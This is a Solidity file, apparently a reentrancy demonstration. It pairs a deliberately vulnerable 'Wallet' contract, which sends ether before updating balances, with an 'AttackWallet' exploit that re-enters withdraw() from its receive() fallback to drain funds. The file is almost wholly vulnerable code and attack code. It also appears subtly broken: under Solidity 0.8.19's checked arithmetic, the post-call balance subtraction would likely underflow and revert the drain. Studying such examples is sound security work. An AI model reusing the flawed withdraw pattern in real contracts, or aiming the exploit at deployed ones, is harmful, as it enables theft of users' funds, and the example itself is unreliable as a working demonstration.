// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

contract Wallet {
    mapping(address => uint256) public balances;

    function deposit(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _user) public view returns (uint256) {
        return balances[_user];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            require(result, "External call returned false");
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract AttackWallet {
    uint256 constant AMOUNT = 1 ether;
    Wallet walletReent;

    constructor(address payable _wallet) {
        walletReent = Wallet(_wallet);
    }

    function depositAttack() public payable {
        walletReent.deposit{value: AMOUNT}(address(this));
    }

    function attack() external payable {
        walletReent.withdraw(AMOUNT);
    }

    receive() external payable {
        if (address(walletReent).balance >= AMOUNT) {
            walletReent.withdraw(AMOUNT);
        }
    }
}
